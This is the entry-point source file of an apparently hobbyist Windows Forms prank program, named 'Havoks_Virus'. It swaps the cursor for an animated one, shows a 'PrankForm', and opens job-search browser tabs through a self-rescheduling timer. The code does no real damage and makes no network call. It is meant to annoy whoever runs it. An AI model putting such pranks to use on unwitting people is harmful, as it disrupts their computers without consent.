using System;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Havoks_Virus
{
    static class Program
    {
        private static bool tabsOpened = false; // Should be inside the Program class

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool AllocConsole();

        [DllImport("User32.dll")]
        private static extern IntPtr LoadCursorFromFile(string fileName);

        [STAThread]
        static void Main()
        {
            AllocConsole(); // Allocate a console for this app for debugging

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            OpenJobSearchTabsOnce(); // Ensure this is placed correctly before running the form

            // Load and apply the animated cursor
            string cursorPath = "Media/rspin.ani"; // Adjust the path to your .ani file
            IntPtr cursorHandle = LoadCursorFromFile(cursorPath);
            if (!IntPtr.Zero.Equals(cursorHandle))
            {
                Application.UseWaitCursor = false; // Ensure the cursor is not a wait cursor
                Cursor.Current = new Cursor(cursorHandle);
                Application.ApplicationExit += (sender, args) => Cursor.Current.Dispose(); // Dispose of cursor on exit
            }
            else
            {
                MessageBox.Show("Failed to load cursor from file: " + cursorPath); // Fallback message
            }

            // Create and show the first PrankForm as soon as the application starts.
            PrankForm firstForm = new PrankForm();
            firstForm.Show();

            // Continue running the application with the first form
            Application.Run();
        }

        public static void OpenJobSearchTabsOnce()
        {
            Task.Delay(7000).ContinueWith(t => OpenJobSearchTabsOnce()); // Adjust delay as needed
            if (!tabsOpened)
            {
                JobSearch.OpenJobSearchTabs(); // Assuming this method exists and works correctly in JobSearch
                tabsOpened = true;
            }
        }
    }
}
